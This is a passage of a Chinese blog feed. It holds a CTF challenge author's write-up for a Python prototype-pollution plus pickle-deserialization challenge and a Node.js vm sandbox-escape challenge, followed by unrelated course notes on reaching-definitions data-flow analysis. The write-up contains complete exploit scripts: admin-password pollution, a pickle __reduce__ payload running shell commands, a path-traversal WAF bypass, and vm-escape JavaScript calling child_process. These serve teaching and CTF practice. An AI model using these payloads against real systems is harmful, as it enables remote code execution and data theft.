class="line"><span class="language-stata"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span></span><br><span class="line"><span class="language-stata"><span class="keyword">return</span></span></span><br><span class="line"><span class="language-stata">&#125;</span></span><br><span class="line"><span class="language-stata">&#125;</span></span><br><span class="line"><span class="language-stata">--01f54ee8f2872c8a0d42d14f70cdc1fe--</span></span><br><span class="line"><span class="language-stata"></span></span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826485.png" alt="image-20240328182539731"></p><p>然后读flag即可</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826703.png" alt="image-20240328182625676"></p><h3 id="我的出题踩坑点"><a href="#我的出题踩坑点" class="headerlink" title="我的出题踩坑点"></a>我的出题踩坑点</h3><ul><li>由于GZCTF平台的缘故，我原本使用gin来热部署，但是在docker端口暴露上出现了问题（因为gin需要额外的hot-deploy-proxy-port），后面换用了fresh</li><li>也是平台的缘故，改用shell脚本启动服务，这里也是删去环境变量防止非预期的手法</li></ul><h2 id="蟒蛇宝宝"><a href="#蟒蛇宝宝" class="headerlink" title="蟒蛇宝宝"></a>蟒蛇宝宝</h2><p>考点：python原型链污染，pickle反序列化</p><p>出题人：ch3</p><p>难度：困难</p><h3 id="python原型链污染"><a href="#python原型链污染" class="headerlink" title="python原型链污染"></a>python原型链污染</h3><p>原理请参考ttt社区：<a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p><p>可以调试一下merge函数，在<code>__init__.__globals__</code>下可以获得<code>admin</code>对象</p><p>那么可以污染到变量信息，我们可以修改admin的密码</p><pre><code>payload = &#123;    &quot;username&quot;: new_username,    &quot;password&quot;: new_password,    &quot;__init__&quot;: &#123;        &quot;__globals__&quot;: &#123;            &quot;admin&quot;: &#123;                &quot;password&quot;: admin_password            &#125;        &#125;    &#125;&#125;</code></pre><h3 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h3><p>漏洞利用点在Show函数中的pickle.loads，这是一个很危险的地方</p><p>而且pickle反序列化的前提时我们能够重写类，所以红框上一行的loads就用不了了</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111746961.png" alt="image-20240411174112111"></p><p><del>由于学校防火墙以及网络配置等问题，反弹shell操作基本不可能，再说大多数同学应该没有vps吧</del></p><p>所以RCE的结果怎么给外带呢？</p><p>注意到有个static文件夹，这里的文件是可读可下载的，那么我们在<code>__reduce__</code>里可以将flag写入到static中的文件，然后下载即可获得flag</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111746405.png" alt="image-20240411174515840"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111746037.png" alt="image-20240411174639676"></p><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># the attack url</span></span><br><span class="line">baseURL = <span class="string">&quot;http://127.0.0.1:40825&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># rewrite the user class</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, _message, _status</span>):</span><br><span class="line">        self.message = _message</span><br><span class="line">        self.status = _status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;cat /flag &gt; /app/static/img.png&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># register</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AdminPasswordPollute</span>(<span class="params">admin_password, new_username, new_password</span>):</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: new_username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: new_password,</span><br><span class="line">        <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;admin&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;password&quot;</span>: admin_password</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    registerURL = <span class="string">&quot;/register&quot;</span></span><br><span class="line">    req = s.post(url=baseURL + registerURL, json=payload)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]register attack success, you can login as admin by the password: <span class="subst">&#123;admin_password&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]attack error when registering&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LoginAndPickleAttack</span>(<span class="params">admin_password, new_username, new_password</span>):</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: admin_password</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># login as admin</span></span><br><span class="line">    loginURL = <span class="string">&quot;/login&quot;</span></span><br><span class="line">    req = s.post(url=baseURL + loginURL, json=payload)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]Now login as admin&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]fail to login as admin&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    badmsg = Message(<span class="string">&quot;attack&quot;</span>, <span class="string">&quot;good&quot;</span>)</span><br><span class="line">    badmsgbytes = pickle.dumps(badmsg, protocol=<span class="number">4</span>)</span><br><span class="line">    editURL = <span class="string">&quot;/profile/admin/edit&quot;</span></span><br><span class="line">    payload1 = &#123;</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: base64.b64encode(badmsgbytes).decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">        <span class="string">&quot;status&quot;</span>: <span class="string">&quot;nice&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req1 = s.post(url=baseURL + editURL, json=payload1)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> req1.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]upload the attack payload success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]upload the attack payload fail&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># now trigger the python pickle ==&gt; RCE</span></span><br><span class="line">    viewURL = <span class="string">f&quot;/profile/admin/view/api&quot;</span></span><br><span class="line">    req2 = s.get(url=baseURL + viewURL)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">if</span> req2.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]RCE Success!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]RCE Fail..&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">f&quot;wget <span class="subst">&#123;baseURL&#125;</span>/static/img.png -q&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]the flag is:&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;cat ./img.png&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse = argparse.ArgumentParser()</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-AP&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;123456&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;you can reset the admin password by -AdminP option&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-U&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;tester&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;the new register user&#x27;s username&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-P&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;tester&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;the new register user&#x27;s password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    args = parse.parse_args()</span><br><span class="line">    </span><br><span class="line">    adminPassword = args.AP</span><br><span class="line">    registerUsername = args.U</span><br><span class="line">    registerPassword = args.P</span><br><span class="line"></span><br><span class="line">    AdminPasswordPollute(admin_password = adminPassword, new_username=registerUsername, new_password=registerPassword)</span><br><span class="line">    LoginAndPickleAttack(admin_password = adminPassword, new_username=registerUsername, new_password=registerPassword)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="我的出题踩坑点-1"><a href="#我的出题踩坑点-1" class="headerlink" title="我的出题踩坑点"></a>我的出题踩坑点</h3><ul><li>当部署在Windows上时直接访问api接口可以打通，但是部署到docker中的“Linux”环境下给我报了500，好怪~</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111747109.png" alt="image-20240409223338542"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111747317.png" alt="image-20240409223410734"></p><p>​后面检查了下是由于python pickle序列化时会生成的字节会受到操作系统不同的影响（因为当时exp是在windows下写的）</p><p>​所以后面在我的kali里装了个WSRX，然后exp打一遍，通了</p><h2 id="vm出逃计划"><a href="#vm出逃计划" class="headerlink" title="vm出逃计划"></a>vm出逃计划</h2><p>考点：绕过waf读取敏感文件，vm逃逸（CVE）</p><p>出题人：ch3</p><p>难度：简单</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>默认路由下会生成vmtoken，这是进入sandbox执行任意代码的一个check</p><p>在show路由下可以读，但是有个tricky的小waf，payload自己调试构造出来如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = &#x27;?path=.jpg./../vmtoken.txt&#x27;</span><br></pre></td></tr></table></figure><p>然后就是一个NodeJS的VM沙箱逃逸历史洞，对照历史版本去GitHub的issue里面找就行</p><h3 id="完整EXP-1"><a href="#完整EXP-1" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">baseURL = <span class="string">&quot;http://127.0.0.1:3000&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate token</span></span><br><span class="line">resp = s.get(baseURL)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read token</span></span><br><span class="line">attackURL1 = <span class="string">&#x27;/show&#x27;</span></span><br><span class="line">payload1 = <span class="string">&#x27;?path=.jpg./../vmtoken.txt&#x27;</span></span><br><span class="line">resp = s.get(baseURL+attackURL1+payload1)</span><br><span class="line"><span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+]get vm token: <span class="subst">&#123;resp.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[-]can not get the vm token&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">token = resp.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># RCE</span></span><br><span class="line">attackURL2 = <span class="string">&#x27;/sandbox&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个payload只能RCE一次,有点怪</span></span><br><span class="line">rcecode1 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">err = &#123;&#125;;</span></span><br><span class="line"><span class="string">const handler = &#123;</span></span><br><span class="line"><span class="string">    getPrototypeOf(target) &#123;</span></span><br><span class="line"><span class="string">        (function stack() &#123;</span></span><br><span class="line"><span class="string">            new Error().stack;</span></span><br><span class="line"><span class="string">            stack();</span></span><br><span class="line"><span class="string">        &#125;)();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const proxiedErr = new Proxy(err, handler);</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    throw proxiedErr;</span></span><br><span class="line"><span class="string">&#125; catch (&#123;constructor: c&#125;) &#123;</span></span><br><span class="line"><span class="string">    c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag &gt; ./img/flag.txt&#x27;);</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rcecode2 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">async function fn() &#123;</span></span><br><span class="line"><span class="string">    (function stack() &#123;</span></span><br><span class="line"><span class="string">        new Error().stack;</span></span><br><span class="line"><span class="string">        stack();</span></span><br><span class="line"><span class="string">    &#125;)();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">p = fn();</span></span><br><span class="line"><span class="string">p.constructor = &#123;</span></span><br><span class="line"><span class="string">    [Symbol.species]: class FakePromise &#123;</span></span><br><span class="line"><span class="string">        constructor(executor) &#123;</span></span><br><span class="line"><span class="string">            executor(</span></span><br><span class="line"><span class="string">                (x) =&gt; x,</span></span><br><span class="line"><span class="string">                (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag &gt; ./img/flag.txt&#x27;); &#125;</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">p.then();&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">f&#x27;?vmtoken=<span class="subst">&#123;token&#125;</span>&amp;code=<span class="subst">&#123;rcecode2&#125;</span>&#x27;</span></span><br><span class="line">resp2 = s.get(baseURL+attackURL2+payload2)</span><br><span class="line"><span class="keyword">if</span> resp2.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+]rce success&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[-]rce fail&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get flag</span></span><br><span class="line">attackURL3 = <span class="string">&#x27;/show&#x27;</span></span><br><span class="line">payload3 = <span class="string">&#x27;?path=.jpg./../flag3.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">resp3 = s.get(baseURL+attackURL3+payload3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> resp3.status_code == <span class="number">200</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">f&#x27;[+]now get flag: <span class="subst">&#123;resp3.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     print(f&#x27;[-]fail to get flag&#x27;)</span></span><br><span class="line"><span class="comment">#     s.close()</span></span><br><span class="line"><span class="comment">#     exit(1)</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h3 id="我的出题踩坑点-2"><a href="#我的出题踩坑点-2" class="headerlink" title="我的出题踩坑点"></a>我的出题踩坑点</h3><ul><li><p>CRLF的影响：解决方案&#x3D;&gt;使用python脚本实现网络交互，这样会比直接在浏览器GUI下操作更加细腻</p></li><li><p>两个payload进行RCE的效果不同，一个只能RCE一次（还没调试过）</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJU-Static-Analysis-Data-Flow-Analysis-1</title>
      <link href="/2024/03/30/StaticAnalysis/NJU-Static-Analysis-Data-Flow-Analysis-1/"/>
      <url>/2024/03/30/StaticAnalysis/NJU-Static-Analysis-Data-Flow-Analysis-1/</url>
      
        <content type="html"><![CDATA[<h1 id="NJU-Static-Analysis-Data-Flow-Analysis-1"><a href="#NJU-Static-Analysis-Data-Flow-Analysis-1" class="headerlink" title="NJU-Static-Analysis-Data-Flow-Analysis-1"></a>NJU-Static-Analysis-Data-Flow-Analysis-1</h1><h2 id="Data-Flow-Analysis"><a href="#Data-Flow-Analysis" class="headerlink" title="Data Flow Analysis"></a>Data Flow Analysis</h2><ul><li><p>the core in Data Flow Analysis</p><ul><li>对数据的抽象</li><li>根据分析的类型，做出合适的估算</li><li>数据如何transfer</li><li>控制流如何处理</li><li>CFG</li></ul></li><li><p>May Analysis 和 Must Analysis</p></li></ul><blockquote><p>May analysis：输出信息可能正确 &#x3D;&gt; Sound</p><p>Must analysis：输出信息一定正确 &#x3D;&gt; complete</p></blockquote><ul><li>不同的数据流分析</li></ul><p>转移函数 与 控制流信息</p><blockquote><p>different data-flow analysis applications have</p><p>different data abstraction and</p><p>different flow safe-approximation strategies, i.e.,</p><p>different transfer functions and control-flow handlings</p></blockquote><h2 id="Preliminaries-of-Data-Flow-Analysis"><a href="#Preliminaries-of-Data-Flow-Analysis" class="headerlink" title="Preliminaries of Data Flow Analysis"></a>Preliminaries of Data Flow Analysis</h2><h3 id="Input-and-Output-States"><a href="#Input-and-Output-States" class="headerlink" title="Input and Output States"></a>Input and Output States</h3><ul><li><p>IR statement（$s_1$ ，$s_2$，$s_3$）</p></li><li><p>program point（input state 和 output state）&#x3D;&gt; 控制流edge上的程序状态</p><p>在具体的数据流分析中，我们把<code>PP</code>关联一个数据流值，代表该点中可观察到的抽象的程序状态</p></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404301046489.png" alt="image-20240330195245325"></p><p><strong>一个说明Program Point的例子：</strong></p><p>​下图中的红色点就是Program Point</p><p>​Program Point与一个 data - flow value相挂钩</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404301046877.png" alt="image-20240330200520251"></p><p><strong>数据流分析</strong></p><blockquote><p>数据流分析：为所有语句的IN[s]和OUT[s]的一组安全近似导向约束找到一个解决方案</p><ul><li>基于语句语义的约束，传递函数</li><li>基于控制流的约束</li></ul></blockquote><h3 id="Transfer-Function’s-Constrains"><a href="#Transfer-Function’s-Constrains" class="headerlink" title="Transfer Function’s Constrains"></a>Transfer Function’s Constrains</h3><ul><li>控制流分析类型</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011958311.png" alt="image-20240430195315785"></p><h3 id="控制流的约束"><a href="#控制流的约束" class="headerlink" title="控制流的约束"></a>控制流的约束</h3><ul><li>BB内控制流</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011958981.png" alt="image-20240430221453025"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011958968.png" alt="image-20240430221500576"></p><ul><li>BB间控制流</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011958217.png" alt="image-20240430221609827"></p><h2 id="Reaching-Definitions-Analysis（到达定值分析）"><a href="#Reaching-Definitions-Analysis（到达定值分析）" class="headerlink" title="Reaching Definitions Analysis（到达定值分析）"></a>Reaching Definitions Analysis（到达定值分析）</h2><h3 id="Reaching-Definitions-基本概念"><a href="#Reaching-Definitions-基本概念" class="headerlink" title="Reaching Definitions 基本概念"></a>Reaching Definitions 基本概念</h3><blockquote><p>program point p 处对变量v的定义在q处可达，指p到q有一条路径，且在这条路径中不再存在对v的定义</p></blockquote><ul><li><p>x的定值d到达 （reaching） p：假定x有定值d（definition），如果存在一个路径p，并且在该路径上没有x的其他定值点</p></li><li><p>如果该路径上对 x 有其他定义，我们称x这个定值在该路径上 killed 了</p></li></ul><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404301156280.png" alt="rd" style="zoom:50%;" /><p>到达定值分析可以用来检测源代码中的未定义变量，检测思路：CFG入口处为源代码中的所有变量引入dummy definition，如果最终某个变量v的dummy definition能够达到该变量使用的program point，则变量v为未定义变量</p><h3 id="bit-vector"><a href="#bit-vector" class="headerlink" title="bit vector"></a>bit vector</h3><blockquote><p>使用bit vector的数据结构来表示：对于某个Program Point（记为p），$D_i$在该处置为1 &lt;&#x3D;&gt; $D_i$​处的变量定义经过某个BB后能够到达p</p></blockquote><p>​比如下图中的蓝色箭头中的<code>1100 0000</code>，表示$D_1$这条definition中的变量x在经过B2后能够到达</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011956796.png" alt="image-20240501195618460"></p><h3 id="Transfer-Function和Control-Flow-约束"><a href="#Transfer-Function和Control-Flow-约束" class="headerlink" title="Transfer Function和Control Flow 约束"></a>Transfer Function和Control Flow 约束</h3><ul><li>Transfer Function（转移函数）约束</li></ul><p>​Gen指当前BB中存有的definition，而Kill指当前块中存有的definition对应的变量对应的其他definition</p><blockquote><p>例子：B1块中有$d_1$、$d_2$、$d_3$三条definition（记为<code>gen</code>），其对应变量为<code>i</code>、<code>j</code>、<code>a</code>，这三个变量有关的、且在其他BB的definition有$d_4$、$d_5$、$d_6$、$d_7$（记为<code>kill</code>）</p></blockquote><p>​一个BB的gen和kill都可以直接通过扫描所有BB来确定</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404302223446.png" alt="image-20240430220521445"></p><ul><li>control flow handling（控制流处理）约束</li></ul><p>​处理下一个<code>BB</code>的<code>In[B]</code>，因为输入可能来自很多其他<code>BB</code>的<code>OUT</code>，所以使用<code>Union</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404302222639.png" alt="image-20240430220220603"></p><h3 id="到达定值分析的算法"><a href="#到达定值分析的算法" class="headerlink" title="到达定值分析的算法"></a>到达定值分析的算法</h3><p>​Boundary Condition和其他Basic Block需要分隔开（可以理解为这是一个Iteration算法模板）</p><p>​</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404302223053.png" alt="image-20240430222310088"></p><p>​</p><p>​例子：参考课程PPT，跟一遍就能体悟到</p><h4 id="算法停止的时机"><a href="#算法停止的时机" class="headerlink" title="算法停止的时机"></a>算法停止的时机</h4><p>​这是整个算法的灵魂，重点在于<code>transfer function</code>的设计</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011958821.png" alt="image-20240501190302838"></p><p>​对于一个已经构建好的控制流图，其gen[B]和kill[B]是固定的，所以能在多层迭代中存留的1必定会一直存留，所以正如课中所言，bit vector中每一位的最终结果必然是<code>0-&gt;1</code>或<code>1-&gt;1</code>，同时definition的个数为有限。</p><p>​所以必然存在一个bit vector的状态上界，等到某轮迭代结束后到达这个上界，使得算法停止</p>]]></content>
      
      
      
        <tags>
